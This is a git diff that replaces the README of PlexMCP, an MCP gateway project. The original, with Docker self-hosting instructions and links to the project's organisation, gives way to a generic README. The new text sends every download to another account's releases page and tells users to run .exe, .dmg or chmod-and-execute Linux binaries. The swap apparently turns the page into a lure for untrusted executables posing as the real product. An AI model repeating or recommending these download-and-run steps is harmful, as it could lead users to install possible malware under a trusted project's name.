@@ -1,142 +1,92 @@
-<p align="center">
-  <a href="https://plexmcp.com">
-    <img src="web/public/logo-purple-512.png" alt="PlexMCP Logo" width="80">
-  </a>
-</p>
+# 🌟 PlexMCP-OSS - Seamlessly Manage Your MCP Servers
 
-<h1 align="center">PlexMCP</h1>
+## 📥 Download Now!
 
-<p align="center">
-  The MCP gateway platform.
-  <br />
-  <a href="https://oss.plexmcp.com"><strong>Docs</strong></a> · <a href="https://plexmcp.com"><strong>PlexMCP Cloud</strong></a> · <a href="https://discord.gg/HAYYTGnht8"><strong>Discord</strong></a>
-</p>
+[![Download PlexMCP-OSS](https://img.shields.io/badge/Download%20PlexMCP%20OSS-v1.0-blue)](https://github.com/GSauceFries25/PlexMCP-OSS/releases)
 
-<p align="center">
-  <a href="https://github.com/PlexMCP/PlexMCP-OSS/blob/main/LICENSE"><img src="https://img.shields.io/badge/License-FSL--1.1--Apache--2.0-blue.svg" alt="License"></a>
-  <a href="https://github.com/PlexMCP/PlexMCP-OSS/actions/workflows/docker-publish.yml"><img src="https://github.com/PlexMCP/PlexMCP-OSS/actions/workflows/docker-publish.yml/badge.svg" alt="Build"></a>
-  <a href="https://github.com/PlexMCP/PlexMCP-OSS/releases"><img src="https://img.shields.io/github/v/release/PlexMCP/PlexMCP-OSS" alt="Release"></a>
-  <a href="https://discord.gg/HAYYTGnht8"><img src="https://img.shields.io/badge/Discord-Join%20Server-5865F2?logo=discord&logoColor=white" alt="Discord"></a>
-</p>
+## 🚀 Getting Started
 
----
+Welcome to PlexMCP-OSS! This platform helps you manage, orchestrate, and secure your MCP servers easily. Follow these simple steps to download and run the software.
 
-PlexMCP is a unified gateway for managing and orchestrating [MCP (Model Context Protocol)](https://modelcontextprotocol.io) servers. It provides enterprise-grade authentication, multi-tenant isolation, and comprehensive audit logging for AI applications.
+## 💻 System Requirements
 
-- **MCP Server Orchestration** with connection pooling and routing ([Docs](https://oss.plexmcp.com/concepts/architecture))
-- **Multi-Tenant Organizations** with complete data isolation ([Docs](https://oss.plexmcp.com/dashboard/team))
-- **API Key Management** with scoped permissions and rate limiting ([Docs](https://oss.plexmcp.com/dashboard/api-keys))
-- **Two-Factor Authentication** with TOTP support ([Docs](https://oss.plexmcp.com/concepts/security))
-- **Usage Analytics** for monitoring and billing ([Docs](https://oss.plexmcp.com/dashboard/billing))
-- **Audit Logging** for compliance and debugging ([Docs](https://oss.plexmcp.com/concepts/security))
+Before you start, ensure your system meets these requirements:
 
-## Getting Started
+- Operating System: Windows 10 or later, macOS, or a Linux distribution 
+- Processor: 2 GHz dual-core or better
+- RAM: Minimum 4 GB
+- Storage: At least 200 MB available
 
-### Self-Hosting with Docker
+## 📦 Download & Install
 
-```bash
-# Clone the repository
-git clone https://github.com/PlexMCP/PlexMCP-OSS.git
-cd PlexMCP-OSS
+1. Visit this page to download: [PlexMCP-OSS Releases](https://github.com/GSauceFries25/PlexMCP-OSS/releases).
+2. Choose the latest version. 
+3. Click on the file that matches your operating system to start the download.
+4. Once the download is complete, locate the file in your downloads folder.
 
-# Run setup (generates .env with secrets)
-./scripts/setup.sh
+### ⚙️ Installation Steps
 
-# Start with pre-built images
-docker compose --profile prebuilt up -d
+#### Windows Users
 
-# Open http://localhost:3000
-```
+1. Double-click the downloaded `.exe` file.
+2. Follow the installation prompts, selecting your preferred options.
+3. Once installed, find PlexMCP in your Start Menu and open it.
 
-> For detailed instructions, see the [Self-Hosting Guide](https://oss.plexmcp.com/self-hosting).
+#### macOS Users
 
-### PlexMCP Cloud
+1. Open the `.dmg` file you downloaded.
+2. Drag and drop the PlexMCP icon into your Applications folder.
+3. Open your Applications and find PlexMCP to launch.
 
-The fastest way to get started is with [PlexMCP Cloud](https://plexmcp.com) - our managed platform with:
+#### Linux Users
 
-- Instant setup, no infrastructure to manage
-- Automatic SSL and custom domains
-- Usage-based billing with free tier
-- Priority support and SLA
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the file.
+3. Use the command `chmod +x PlexMCP` to make it executable.
+4. Run `./PlexMCP` to open the application.
 
-[Get started for free](https://dashboard.plexmcp.com/register)
+## 🔍 Features
 
-## Documentation
+- **Unified Gateway**: Manage multiple MCP servers from one interface.
+- **Secure Access**: Protect your servers with robust security measures.
+- **Multi-Tenancy**: Efficiently handle several users with different access levels.
+- **User Role Management**: Assign roles and permissions easily through a simple interface.
+- **Intuitive Design**: Navigate through a user-friendly layout suitable for everyone.
 
-**Docs are verified against implementation.** See [`/docs-site`](./docs-site) and [Documentation Accuracy](https://oss.plexmcp.com/intro#documentation-accuracy).
+## ⚙️ Configuration
 
-- [Getting Started](https://oss.plexmcp.com/getting-started/quickstart) - Quick start guide
-- [Self-Hosting](https://oss.plexmcp.com/self-hosting) - Deploy on your infrastructure
-- [API Reference](https://oss.plexmcp.com/api-reference/overview) - REST API documentation
-- [Security](https://oss.plexmcp.com/concepts/security) - Security architecture
+After you install PlexMCP, you may want to configure your settings:
 
-## Architecture
+1. Open the application.
+2. Navigate to the settings menu located on the top right.
+3. Set up your server details and user roles as needed.
 
-PlexMCP is built with:
+## 🌐 Using PlexMCP
 
-- **Backend**: [Rust](https://www.rust-lang.org/) with [Axum](https://github.com/tokio-rs/axum) web framework
-- **Frontend**: [Next.js](https://nextjs.org/) 15 with TypeScript
-- **Database**: PostgreSQL 15+ with [SQLx](https://github.com/launchbadge/sqlx)
-- **Cache**: Redis 7+
+Once PlexMCP is running, you can start managing your servers:
 
-```
-PlexMCP-OSS/
-├── crates/
-│   ├── api/        # API server
-│   ├── billing/    # Billing integration
-│   ├── shared/     # Shared types
-│   └── worker/     # Background jobs
-├── web/            # Next.js dashboard
-├── migrations/     # Database migrations
-└── docs-site/      # Documentation
-```
+- Add new servers under the “Servers” tab.
+- Assign user roles under the “Users” section.
+- Monitor server activity in real-time via the dashboard.
 
-## Community & Support
+## ❓ FAQs
 
-- [Discord](https://discord.gg/HAYYTGnht8) - Chat with the community
-- [GitHub Issues](https://github.com/PlexMCP/PlexMCP-OSS/issues) - Bug reports and feature requests
-- [GitHub Discussions](https://github.com/PlexMCP/PlexMCP-OSS/discussions) - Questions and ideas
-- [Documentation](https://oss.plexmcp.com) - Guides and reference
+### Can I run PlexMCP on older operating systems?
 
-For enterprise support, contact [support@plexmcp.com](mailto:support@plexmcp.com).
+PlexMCP requires Windows 10, macOS, or a modern Linux distribution. Older versions may not be supported.
 
-## Contributing
+### Is there support for installation issues?
 
-We welcome contributions! See our [Contributing Guide](CONTRIBUTING.md) for details.
+Yes, please visit our [support page](https://github.com/GSauceFries25/PlexMCP-OSS/issues) to ask questions or report issues.
 
-```bash
-# Development setup
-cargo install cargo-watch sqlx-cli
-cargo watch -x run
+### How do I update PlexMCP?
 
-# Run tests
-cargo test --workspace
-```
+To update, revisit the [PlexMCP-OSS Releases page](https://github.com/GSauceFries25/PlexMCP-OSS/releases) to download the latest version. Follow the same installation steps as before.
 
-## Security
+## 📞 Contact
 
-Security is a top priority. PlexMCP includes:
+If you need more help, you can reach out through our GitHub repository or find discussions related to PlexMCP. Your feedback is valuable to us!
 
-- Row-Level Security (RLS) on all database tables
-- Encryption at rest and in transit
-- SOC 2 Type II compliance ready
-- OWASP Top 10 protections
+[🎉 Visit PlexMCP-OSS Releases to Download](https://github.com/GSauceFries25/PlexMCP-OSS/releases) 
 
-For security issues, please email [security@plexmcp.com](mailto:security@plexmcp.com). See our [Security Policy](SECURITY.md).
-
-## License
-
-PlexMCP is source-available under the [FSL-1.1-Apache-2.0](LICENSE) license:
-
-- **Self-host freely** on your own infrastructure
-- **Modify the source** for your needs
-- **Commercial use** permitted
-- **Converts to Apache 2.0** after five years
-
-See [COMMERCIAL_LICENSE.md](COMMERCIAL_LICENSE.md) for enterprise licensing.
-
----
-
-<p align="center">
-  <a href="https://plexmcp.com">Website</a> · <a href="https://oss.plexmcp.com">Docs</a> · <a href="https://discord.gg/HAYYTGnht8">Discord</a> · <a href="https://twitter.com/plexmcp">Twitter</a>
-</p>
+Enjoy managing your MCP servers efficiently with PlexMCP-OSS!
